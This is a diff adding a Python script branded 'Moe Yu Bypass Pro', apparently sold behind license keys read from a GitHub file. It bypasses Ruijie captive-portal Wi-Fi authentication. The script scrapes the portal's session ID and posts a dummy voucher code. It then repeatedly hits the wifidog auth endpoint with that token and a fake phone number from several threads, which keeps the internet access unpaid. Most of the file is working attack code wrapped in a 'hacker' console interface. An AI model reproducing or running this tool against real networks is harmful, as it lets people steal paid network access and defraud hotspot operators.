@@ -1,0 +1,237 @@
+import requests
+import re
+import urllib3
+import time
+import threading
+import logging
+import random
+import sys
+from urllib.parse import urlparse, parse_qs, urljoin
+from rich.console import Console
+from rich.panel import Panel
+from rich.align import Align
+from rich.text import Text
+
+# ===============================
+# CONFIG & INITIALIZATION
+# ===============================
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+console = Console()
+
+PING_THREADS = 5
+MIN_INTERVAL = 0.05
+MAX_INTERVAL = 0.2
+DEBUG = False
+
+# COLOR SYSTEM (Hacker UI)
+RED = "\033[91m"
+GREEN = "\033[92m"
+CYAN = "\033[96m"
+YELLOW = "\033[93m"
+MAGENTA = "\033[95m"
+RESET = "\033[0m"
+
+# LOGGING
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s | %(message)s",
+    datefmt="%H:%M:%S"
+)
+
+stop_event = threading.Event()
+
+# ===============================
+# GITHUB DATABASE CONFIG
+# ===============================
+# သင်ပေးထားသော GitHub Raw Link အသစ်
+URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
+
+# သင်တောင်းဆိုထားသော Moe Yu Logo Banner
+BANNER = """
+[bold #00FF00]
+ ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
+ ║║║║ ║║╣   ╚╦╝║ ║
+ ╩ ╩╚═╝╚═╝   ╩ ╚═╝
+      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
+[/bold #00FF00]
+"""
+
+# ===============================
+# UI FUNCTIONS
+# ===============================
+def display_hacker_flag():
+    w = 40 
+    yellow = f"[bold on yellow]{' ' * w}[/bold on yellow]"
+    green  = f"[bold on green]{' ' * 19}★{' ' * 20}[/bold on green]"
+    red    = f"[bold on red]{' ' * w}[/bold on red]"
+    flag_map = f"{yellow}\n{green}\n{red}"
+    console.print(Align.center(Panel(flag_map, border_style="bold white", padding=(0, 0), expand=False)))
+    console.print(Align.center(BANNER))
+    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]"))
+    console.print(Align.center("[bold #333333]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold #333333]\n"))
+
+def simpler_hacker_typing(text, style="bold green"):
+    prefix = "[bold #00FF00]>>> [/bold #00FF00]"
+    console.print(prefix, end="")
+    for char in text:
+        console.print(Text(char, style=style), end="")
+        sys.stdout.flush()
+        time.sleep(0.02)
+    console.print()
+
+def hacking_status(message, duration=0.8):
+    with console.status(f"[bold green]{message}[/bold green]", spinner="dots12", spinner_style="bold green"):
+        time.sleep(duration + random.uniform(0.1, 0.4))
+
+def success_fireworks():
+    colors = ["red", "orange", "yellow", "green", "cyan", "magenta", "white"]
+    for _ in range(3):
+        for _ in range(12):
+            fire = " " * random.randint(1, 40) + random.choice(["✨", "💥", "🔥", "⚡"]) + " " * random.randint(1, 10)
+            console.print(Text(fire, style=random.choice(colors)))
+            time.sleep(0.03)
+        console.print(Align.center("[bold gold1]🎆 SYSTEM UNLOCKED 🎆[/bold gold1]"))
+        time.sleep(0.2)
+
+# ===============================
+# GITHUB LICENSE CHECK
+# ===============================
+def check_license_hacker_style():
+    console.clear()
+    display_hacker_flag()
+    console.print(Align.center(Panel("[bold white]AWAITING AUTHORIZATION KEY[/bold white]", border_style="bold #00FF00", expand=False)))
+    try:
+        user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
+    except EOFError:
+        user_key = ""
+    if not user_key:
+        console.print("\n[bold red][!] ERROR: NULL_KEY[/bold red]")
+        sys.exit()
+
+    hacking_status("Connecting to GitHub Database...")
+    try:
+        # GitHub မှ Key များလှမ်းဖတ်ခြင်း
+        response = requests.get(URL, timeout=10)
+        valid_keys = [k.strip() for k in response.text.splitlines() if k.strip()]
+        
+        hacking_status("Decrypting Database...")
+        if user_key in valid_keys:
+            success_fireworks()
+            simpler_hacker_typing("ACCESS_GRANTED: AUTHENTICATION SUCCESS")
+            return True
+        else:
+            simpler_hacker_typing("ACCESS_DENIED: INVALID_KEY", style="bold red")
+            console.print("\n[bold red]❌ Key မှားယွင်းနေပါသည်။ Admin ထံမှာ ဝယ်ယူပါ။[/bold red]")
+            sys.exit()
+    except Exception as e:
+        console.print(f"\n[bold red]📡 DATABASE ERROR: Check internet connection.[/bold red]")
+        sys.exit()
+
+# ===============================
+# BYPASS ENGINE FUNCTIONS
+# ===============================
+def check_real_internet():
+    try:
+        return requests.get("http://www.google.com", timeout=3).status_code == 200
+    except:
+        return False
+
+def bypass_banner():
+    print(f"""{MAGENTA}
+╔══════════════════════════════════════╗
+║        Ruijie All Version Bypass     ║
+║        Moe Yu Special Edition        ║
+╚══════════════════════════════════════╝
+{RESET}""")
+
+def high_speed_ping(auth_link, sid):
+    session = requests.Session()
+    while not stop_event.is_set():
+        try:
+            session.get(auth_link, timeout=5)
+            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
+        except:
+            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
+            break
+        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
+
+def start_bypass_process():
+    bypass_banner()
+    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")
+
+    while not stop_event.is_set():
+        session = requests.Session()
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
+        try:
+            r = requests.get(test_url, allow_redirects=True, timeout=5)
+            if r.url == test_url:
+                if check_real_internet():
+                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
+                    time.sleep(5)
+                    continue
+
+            portal_url = r.url
+            parsed_portal = urlparse(portal_url)
+            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
+
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            r2 = session.get(next_url, verify=False, timeout=10)
+
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
+
+            if not sid:
+                logging.warning(f"{RED}Session ID Not Found{RESET}")
+                time.sleep(5)
+                continue
+
+            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
+            
+            # Voucher Endpoint check
+            voucher_api = f"{portal_host}/api/auth/voucher/"
+            try:
+                session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+            except:
+                pass
+
+            params = parse_qs(parsed_portal.query)
+            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+            gw_port = params.get('gw_port', ['2060'])[0]
+            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
+
+            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
+            for _ in range(PING_THREADS):
+                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
+
+            while check_real_internet():
+                time.sleep(5)
+        except Exception as e:
+            if DEBUG:
+                logging.error(f"{RED}Error: {e}{RESET}")
+            time.sleep(5)
+
+# ===============================
+# MAIN EXECUTION
+# ===============================
+if __name__ == "__main__":
+    if check_license_hacker_style():
+        with console.status("[bold green]Injecting Packets...", spinner="shark"):
+            time.sleep(2)
+        
+        console.print(Panel(
+            Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"),
+            border_style="bold red",
+            expand=False
+        ))
+        
+        try:
+            start_bypass_process()
+        except KeyboardInterrupt:
+            stop_event.set()
+            print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
+
